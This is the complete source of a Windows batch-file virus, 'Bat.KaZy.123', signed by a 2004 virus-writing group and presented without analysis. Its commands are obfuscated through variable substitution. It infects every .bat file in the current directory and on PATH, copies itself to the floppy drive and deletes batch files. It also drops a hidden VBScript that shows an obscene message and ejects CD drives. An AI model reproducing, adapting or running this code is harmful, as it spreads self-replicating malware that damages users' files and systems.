   ::Bat.KaZy.123 by -=:KaZy[LOD] VX Team 2004:=-
   @Echo off
   %_Bat.KaZy.123%Attrib %0 +r
   %_Bat.KaZy.123%SEt a=%%a
   %_Bat.KaZy.123%sE%1t b=ty
   %_Bat.KaZy.123%S%1eT c=pe
   %_Bat.KaZy.123%se%1T d=co
   %_Bat.KaZy.123%S%1Et e=py
   %_Bat.KaZy.123%s%1Et Letter=Chr
   %_Bat.KaZy.123%sE%1T Trace=%2
   %_Bat.KaZy.123%%d%%e% %1*.bat %path%\*.bat %2\ > nul
   %_Bat.KaZy.123%%d%%e% %0 Virii.tmp > nul
   %_Bat.KaZy.123%FOr %a% iN (*.bat %path%\*.bat) dO %b%%c% Virii.tmp > %2\%a% | %d%%e% %2\%a% %a%
   %_Bat.KaZy.123%S%1Et Encryp=Count
   %_Bat.KaZy.123%S%1Et Payload=Echo
   %_Bat.KaZy.123%deL Virii.tmp /q
   %_Bat.KaZy.123%s%1Et Crypt=%Letter%
   %_Bat.KaZy.123%%d%%e% %0 a:\ /y > Nul
   %_Bat.KaZy.123%dEL %Trace%\*.bat /q
   %_Bat.KaZy.123%S%1Et Encrypt=%Encryp%
   %_Bat.KaZy.123%S%1Et Trace=
   %_Bat.KaZy.123%Se%1t a=
   %_Bat.KaZy.123%S%1Et VXER=%Payload%
   %_Bat.KaZy.123%If ExIsT %2\Message.vbs Goto strPayload
   %_Bat.KaZy.123%%VXER% MsgBox %Crypt%(89) + %Crypt%(111) + %Crypt%(117) + %Crypt%(114) + %Crypt%(32) + %Crypt%(105) + %Crypt%(110) + %Crypt%(102) + %Crypt%(101) + %Crypt%(99) + %Crypt%(116) + %Crypt%(101) + %Crypt%(100) + %Crypt%(32) + %Crypt%(109) + %Crypt%(111) + %Crypt%(116) + %Crypt%(104) + %Crypt%(101) + %Crypt%(114) + %Crypt%(32) + %Crypt%(102) + %Crypt%(117) + %Crypt%(99) + %Crypt%(107) + %Crypt%(101) + %Crypt%(114) + %Crypt%(33) >>%2\Message.vbs
   %VXER% Set oWMP = CreateObject("WMPlayer.OCX.7") >>%2\Message.vbs
   %VXER% Set colCDROMs = oWMP.cdromCollection >>%2\Message.vbs
   %VXER%.
   %VXER%if colCDROMs.Count >= 1 then >>%2\Message.vbs
   %VXER%    For i = 0 to colCDROMs.%Encrypt% - 1 >>%2\Message.vbs
   %VXER%        colCDROMs.Item(i).Eject >>%2\Message.vbs
   %VXER%    Next  ' cdrom >>%2\Message.vbs
   %VXER%End If >>%2\Message.vbs
   %_Bat.KaZy.123%Attrib %2\Message.vbs +h
   :strPayload
   %_Bat.KaZy.123%Start %2\Message.vbs
   Exit
   ::Greetz
   ::Every1 in LOD! & #Coderz!
